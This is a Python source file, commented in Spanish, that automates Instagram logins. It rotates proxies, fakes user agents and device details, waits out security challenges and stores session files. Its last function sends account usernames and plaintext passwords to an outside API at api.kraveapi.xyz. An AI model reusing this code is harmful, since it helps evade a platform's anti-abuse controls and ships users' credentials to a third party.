import os
import random
import json
import time
import logging
import requests
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, LoginRequired, ClientError, PleaseWaitFewMinutes
from dotenv import load_dotenv

# Configurar logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("instagrapi")
logger.setLevel(logging.WARNING)  # Reducir logs de instagrapi

load_dotenv()
PROXY_FILE = "src/proxies/proxies.txt"
MAX_REINTENTOS = 3  # Reducir reintentos para fallar más rápido
ESPERA_CHALLENGE_SEGUNDOS = 90  # Tiempo para aprobación manual
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/15.0 Mobile/19A346 Safari/602.1",
    "Instagram 269.0.0.18.75 Android (28/9.0; 480dpi; 1080x2260; Huawei; CLT-L29; HWCLT; kirin970; en_US; 367496856)"
]

def obtener_proxies():
    """Obtiene proxies validados y funcionales"""
    if not os.path.exists(PROXY_FILE):
        return []
    
    proxies_validos = []
    with open(PROXY_FILE, "r") as f:
        for proxy in f:
            proxy = proxy.strip()
            if proxy:
                if validar_proxy(proxy):
                    proxies_validos.append(proxy)
                else:
                    logging.warning(f"Proxy no válido: {proxy}")
    
    if not proxies_validos:
        logging.error("⚠️ No hay proxies válidos disponibles")
    
    return proxies_validos

def validar_proxy(proxy):
    """Valida que el proxy sea funcional"""
    try:
        test_url = "http://instagram.com"
        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        response = requests.get(test_url, proxies=proxies, timeout=10)
        return response.status_code == 200
    except:
        return False

def configurar_cliente(cl):
    """Configura el cliente con parámetros realistas"""
    # Rotación de User-Agent
    cl.set_user_agent(random.choice(USER_AGENTS))
    
    # Dispositivo Android genérico
    cl.set_device({
        "app_version": "269.0.0.18.75",
        "android_version": 29,
        "android_release": "10.0.0",
        "dpi": "480dpi",
        "resolution": "1080x2260",
        "manufacturer": "Huawei",
        "device": "CLT-L29",
        "model": "HWCLT",
        "cpu": "kirin970"
    })
    
    # Configuración regional
    cl.set_locale("en_US")
    cl.set_country("US")
    cl.set_country_code(1)
    cl.set_timezone_offset(int(time.timezone / 3600))
    
    # Limitar reintentos internos
    cl.set_retry_delay(10)
    cl.set_max_retries(1)
    
    return cl

def login_instagram(username, password):
    proxies = obtener_proxies()
    if not proxies:
        logging.error("❌ No hay proxies disponibles para el login")
        return None
        
    random.shuffle(proxies)
    
    for i, raw_proxy in enumerate(proxies[:MAX_REINTENTOS]):
        cl = Client()
        configurar_cliente(cl)
        
        logging.info(f"🔌 Intento {i+1} con proxy: {raw_proxy.split('@')[-1]}")
        
        try:
            # Formatear proxy correctamente
            if "@" in raw_proxy:
                proxy_url = f"http://{raw_proxy}"
            else:
                proxy_url = f"http://{raw_proxy}"
            
            cl.set_proxy(proxy_url)
            
            # Primera llamada a Instagram sin login
            cl.get_timeline_feed()
            time.sleep(random.uniform(1, 3))
            
            # Intentar login
            login_result = cl.login(username, password)
            if login_result:
                logging.info(f"✅ Login exitoso para {username}")
                return cl
                
        except ChallengeRequired:
            logging.warning(f"⚠️ Desafío de seguridad para {username}")
            return resolver_desafio(cl, username, password)
            
        except PleaseWaitFewMinutes as e:
            wait_time = min(60 * (i+1), 300)  # Espera exponencial máxima 5 min
            logging.warning(f"⏳ Instagram bloqueó temporalmente: {e}. Esperando {wait_time}s...")
            time.sleep(wait_time)
            continue
            
        except ClientError as e:
            if "internal server error" in str(e).lower():
                logging.error("🌐 Error interno de Instagram - Probable bloqueo permanente del proxy")
                continue
            logging.error(f"❌ Error de cliente: {e}")
            continue
            
        except Exception as e:
            logging.error(f"❌ Error inesperado: {e}")
            continue

    logging.error(f"❌ Fallaron todos los proxies para {username}")
    return None

def resolver_desafio(cl, username, password):
    """Maneja el proceso de verificación manual"""
    logging.info(f"🔒 Por favor aprueba el acceso en la app de Instagram para {username}")
    logging.info(f"⏳ Esperando {ESPERA_CHALLENGE_SEGUNDOS}s para confirmación...")
    
    for i in range(ESPERA_CHALLENGE_SEGUNDOS // 5):
        time.sleep(5)
        try:
            # Intento silencioso de obtener contenido
            cl.get_timeline_feed()
            logging.info(f"✅ ¡Desafío resuelto! Sesión activa para {username}")
            return cl
        except ChallengeRequired:
            logging.info(f"⌛ Esperando aprobación... ({5*(i+1)}s)")
        except LoginRequired:
            # Intentar relogin si la sesión expiró durante el desafío
            try:
                cl.login(username, password)
                return cl
            except:
                pass
        except Exception as e:
            logging.error(f"⚠️ Error durante desafío: {e}")
    
    logging.error("❌ Tiempo agotado para resolver el desafío")
    return None

def guardar_sesion(cl, username):
    path = f"ig_session_{username}.json"
    try:
        settings = cl.get_settings()
        with open(path, "w") as f:
            json.dump(settings, f, indent=2)
        logging.info(f"💾 Sesión guardada para {username}")
    except Exception as e:
        logging.error(f"⚠️ Error guardando sesión: {e}")

def restaurar_sesion(username, password):
    path = f"ig_session_{username}.json"
    cl = Client()
    configurar_cliente(cl)
    
    if os.path.exists(path):
        try:
            with open(path, "r") as f:
                settings = json.load(f)
                cl.set_settings(settings)
            
            # Verificación ligera de sesión
            try:
                cl.account_info()
                logging.info(f"🔑 Sesión restaurada para {username}")
                return cl
            except (LoginRequired, ChallengeRequired):
                logging.warning("⚠️ Sesión expirada, intentando relogin...")
        except Exception as e:
            logging.error(f"⚠️ Error restaurando sesión: {e}")
    
    return login_instagram(username, password)

def verificar_sesion(cl, username):
    try:
        # Verificación ultra ligera
        cl.get_timeline_feed()
        return True
    except (LoginRequired, ChallengeRequired):
        return False
    except Exception as e:
        logging.error(f"⚠️ Error verificando sesión: {e}")
        return False

# Función para guardar cuentas correctamente
def guardar_cuenta_api(username, password):
    """Envía la cuenta a la API correctamente"""
    url = "https://api.kraveapi.xyz/guardar-cuenta"
    headers = {"Content-Type": "application/json"}
    data = {"username": username, "password": password}
    
    try:
        response = requests.post(url, json=data, headers=headers, timeout=10)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        logging.error(f"❌ Error al guardar cuenta: {e}")
        return {"status": "error", "detalle": str(e)}
